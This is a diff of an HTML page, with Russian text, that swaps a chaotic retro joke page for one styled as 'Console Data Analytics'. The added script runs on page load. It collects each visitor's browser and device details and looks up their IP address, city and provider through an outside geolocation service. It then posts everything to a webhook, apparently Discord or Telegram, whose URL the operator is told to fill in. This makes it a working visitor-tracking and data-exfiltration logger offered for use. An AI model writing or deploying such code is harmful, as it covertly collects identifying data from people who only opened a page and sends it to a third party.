@@ -1,121 +1,141 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>!!! ☢☠☢ !!!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Console Data Analytics</title>
     <style>
         body {
-            background-color: #FFD700;
-            background-image: url('https://www.transparenttextures.com/patterns/carbon-fibre.png');
-            cursor: crosshair;
-            margin: 0;
-            overflow-x: hidden;
-        }
-
-        /* Полная анархия в расположении */
-        .glitch-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-        }
-
-        .main-banner {
-            border: 10px double #000;
-            box-shadow: 20px 20px 0px rgba(0,0,0,0.5);
-            max-width: 90%;
-            margin: 20px;
-        }
-
-        marquee {
-            height: 50px;
-            background: #000;
-            border-top: 2px solid #fff;
-            border-bottom: 2px solid #fff;
-        }
-
-        .gif-grid {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 20px;
+            background-color: #0d1117;
+            color: #58a6ff;
+            font-family: 'Courier New', Courier, monospace;
             padding: 20px;
+            margin: 0;
         }
-
-        .chaos-img {
-            width: 100px;
-            filter: drop-shadow(5px 5px 0px #000);
+        .terminal {
+            max-width: 800px;
+            margin: 0 auto;
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 20px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.5);
         }
-
-        .blink {
-            animation: blinker 0.5s linear infinite;
+        .header {
+            color: #8b949e;
+            border-bottom: 1px solid #30363d;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+            font-size: 14px;
         }
-
-        @keyframes blinker {
-            50% { opacity: 0; }
+        .status {
+            color: #ff7b72;
+            font-weight: bold;
         }
-
-        /* Старые кнопки без текста */
-        .btn-icon {
-            display: inline-block;
-            width: 50px;
-            height: 50px;
-            background: #ccc;
-            border: 4px outset #fff;
-            text-align: center;
-            line-height: 50px;
-            font-size: 30px;
-            text-decoration: none;
-            margin: 10px;
+        .success {
+            color: #7ee787;
         }
-
-        .btn-icon:active {
-            border-style: inset;
-        }
-
-        #fire-bar {
-            position: fixed;
-            bottom: 0;
-            width: 100%;
-            height: 100px;
-            background-image: url('https://web.archive.org/web/20090831190141/http://geocities.com/TimesSquare/Labyrinth/7325/fire.gif');
-            background-repeat: repeat-x;
-            pointer-events: none;
+        pre {
+            background: #0d1117;
+            padding: 15px;
+            border-radius: 4px;
+            border: 1px solid #21262d;
+            overflow-x: auto;
+            color: #c9d1d9;
         }
     </style>
 </head>
 <body>
 
-<marquee scrollamount="20">
-    <img src="https://web.archive.org/web/20091027005003/http://geocities.com/Hollywood/6431/skull.gif" height="40">
-    <span style="color: #FFD700; font-size: 30px;"> 🐍 ☢ 🐍 ☢ 🐍 ☢ 🐍 ☢ 🐍 ☢ 🐍 ☢ </span>
-    <img src="https://web.archive.org/web/20091027005003/http://geocities.com/Hollywood/6431/skull.gif" height="40">
-</marquee>
-
-<div class="glitch-container">
+<div class="terminal">
+    <div class="header">> Инициализация модуля аналитики логов...</div>
+    <p>Статус: <span id="status" class="status">Сбор логов устройства...</span></p>
     
-    http://googleusercontent.com/image_generation_content/0
-
-    <div class="blink">
-        <img src="https://web.archive.org/web/20091027012356/http://geocities.com/SiliconValley/Way/6257/undercon.gif" alt="Under Construction">
-    </div>
-
-    <div class="gif-grid">
-        <img src="https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJndmI3bmZqZnd4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/3o7TKMGpxx6B3K3Z28/giphy.gif" class="chaos-img"> <img src="https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJndmI3bmZqZnd4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/Lopx9eUi34rbq/giphy.gif" class="chaos-img"> <img src="https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJndmI3bmZqZnd4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHhJmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/S9X6m9nJ3t6A8/giphy.gif" class="chaos-img"> <img src="https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJndmI3bmZqZnd4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHhJmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/5wWf7H0qo9N3E1uF8a/giphy.gif" class="chaos-img"> </div>
-
-    <div style="margin-top: 30px;">
-        <a href="#" class="btn-icon">🏠</a>
-        <a href="#" class="btn-icon">💣</a>
-        <a href="#" class="btn-icon">⚙️</a>
-        <a href="#" class="btn-icon">🏴‍☠️</a>
-    </div>
+    <h3>Сформированный пакет данных (JSON):</h3>
+    <pre id="output">Ожидание ответа от сенсоров...</pre>
 </div>
 
-<marquee direction="right" scrollamount="15">
-    <img src="https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJndmI3bmZqZnd4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/10vX6QzRzYnC0/giphy.gif" height="60">
-</marquee>
+<script>
+    async function collectMetrics() {
+        // 1. Собираем внутренние параметры браузера и устройства
+        const report = {
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            platform: navigator.platform || (navigator.userAgentData ? navigator.userAgentData.platform : "Unknown"),
+            language: navigator.language,
+            screen: {
+                width: window.screen.width,
+                height: window.screen.height,
+                colorDepth: window.screen.colorDepth
+            },
+            hardware: {
+                cores: navigator.hardwareConcurrency || "N/A",
+                ram: navigator.deviceMemory || "N/A" // Работает не во всех браузерах
+            },
+            context: {
+                referrer: document.referrer || "Прямой переход",
+                href: window.location.href
+            }
+        };
 
-<div id="fire-bar"></div>
+        // 2. Делаем запрос к внешнему API для получения IP и локации
+        try {
+            const response = await fetch('https://ipapi.co/json/');
+            if (response.ok) {
+                const geo = await response.json();
+                report.network = {
+                    ip: geo.ip,
+                    country: geo.country_name,
+                    region: geo.region,
+                    city: geo.city,
+                    provider: geo.org
+                };
+            }
+        } catch (error) {
+            report.network = {
+                error: "Не удалось определить IP (заблокировано AdBlock или нет сети)"
+            };
+        }
+
+        // Выводим собранный лог на экран
+        document.getElementById('output').textContent = JSON.stringify(report, null, 4);
+        
+        const statusEl = document.getElementById('status');
+        statusEl.textContent = "Данные успешно агрегированы.";
+        statusEl.className = "success";
+
+        // 3. Передача собранных данных на внешний сервер
+        sendData(report);
+    }
+
+    function sendData(payload) {
+        // Вставь сюда URL своего вебхука (например, от Discord или Telegram-бота)
+        const webhookUrl = 'ЗАМЕНИ_НА_ТВОЙ_WEBHOOK_URL';
+
+        if (webhookUrl.startsWith('ЗАМЕНИ_')) {
+            console.log("Данные готовы к отправке. Настройте webhookUrl в коде скрипта.");
+            return;
+        }
+
+        // Пример отправки структуры данных в Discord Webhook
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                embeds: [{
+                    title: "Зафиксирован просмотр страницы",
+                    color: 5814783,
+                    description: `\`\`\`json\n${JSON.stringify(payload, null, 2).substring(0, 1900)}\n\`\`\``
+                }]
+            })
+        }).catch(err => console.error("Ошибка при логировании на сервер:", err));
+    }
+
+    // Запуск процесса при полной загрузке DOM дерева
+    window.addEventListener('DOMContentLoaded', collectMetrics);
+</script>
 
 </body>
 </html>
